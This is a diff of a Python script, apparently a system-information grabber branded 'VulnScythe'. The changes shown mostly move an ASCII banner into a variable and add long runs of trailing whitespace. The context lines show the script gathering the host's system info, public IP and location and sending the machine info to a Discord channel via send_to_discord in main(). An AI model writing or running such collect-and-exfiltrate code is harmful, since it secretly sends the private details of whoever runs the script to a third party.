@@ -49,7 +49,7 @@ def run_command(command: list[str]):
         return f"Unexpected error: {e}"
 
 
-def get_public_ip() -> str | None:
+def get_public_ip():
     """Fetch public IP address from ipify."""
     try:
         response = requests.get("https://api64.ipify.org?format=json", timeout=5)
@@ -59,6 +59,19 @@ def get_public_ip() -> str | None:
         print(f"Error fetching public IP: {e}")
         return None
 
+antiskidd="""
+░██    ░██            ░██              ░██████                            ░██    ░██                   
+░██    ░██            ░██             ░██   ░██                           ░██    ░██                   
+░██    ░██ ░██    ░██ ░██ ░████████  ░██          ░███████  ░██    ░██ ░████████ ░████████   ░███████  
+░██    ░██ ░██    ░██ ░██ ░██    ░██  ░████████  ░██    ░██ ░██    ░██    ░██    ░██    ░██ ░██    ░██ 
+ ░██  ░██  ░██    ░██ ░██ ░██    ░██         ░██ ░██        ░██    ░██    ░██    ░██    ░██ ░█████████ 
+  ░██░██   ░██   ░███ ░██ ░██    ░██  ░██   ░██  ░██    ░██ ░██   ░███    ░██    ░██    ░██ ░██        
+   ░███     ░█████░██ ░██ ░██    ░██   ░██████    ░███████   ░█████░██     ░████ ░██    ░██  ░███████  
+                                                                   ░██                                 
+                                                             ░███████                                  
+Credits: https://github.com/VulnScythe    
+"""                                                                                                                                                                                                         
+                                                                                                                                                                                                                                                                                                                                                                                                                   
 
 def get_location(ip: str):
     """Fetch approximate location info from IP (using ipinfo.io)."""
@@ -102,18 +115,7 @@ def get_system_info():
 
 
 def main():
-    print("""
-░██    ░██            ░██              ░██████                            ░██    ░██                   
-░██    ░██            ░██             ░██   ░██                           ░██    ░██                   
-░██    ░██ ░██    ░██ ░██ ░████████  ░██          ░███████  ░██    ░██ ░████████ ░████████   ░███████  
-░██    ░██ ░██    ░██ ░██ ░██    ░██  ░████████  ░██    ░██ ░██    ░██    ░██    ░██    ░██ ░██    ░██ 
- ░██  ░██  ░██    ░██ ░██ ░██    ░██         ░██ ░██        ░██    ░██    ░██    ░██    ░██ ░█████████ 
-  ░██░██   ░██   ░███ ░██ ░██    ░██  ░██   ░██  ░██    ░██ ░██   ░███    ░██    ░██    ░██ ░██        
-   ░███     ░█████░██ ░██ ░██    ░██   ░██████    ░███████   ░█████░██     ░████ ░██    ░██  ░███████  
-                                                                   ░██                                 
-                                                             ░███████                                  
-Github: https://github.com/VulnScythe                                                                                                                                                                                                                                                                                                    
-""")
+    print(antiskidd)
     
     sysinfo = get_system_info()
     send_to_discord(f"```Machine Info:\n{sysinfo}\n```")
@@ -133,5 +135,6 @@ Github: https://github.com/VulnScythe
 
 if __name__ == "__main__":
     main()
+
 
 
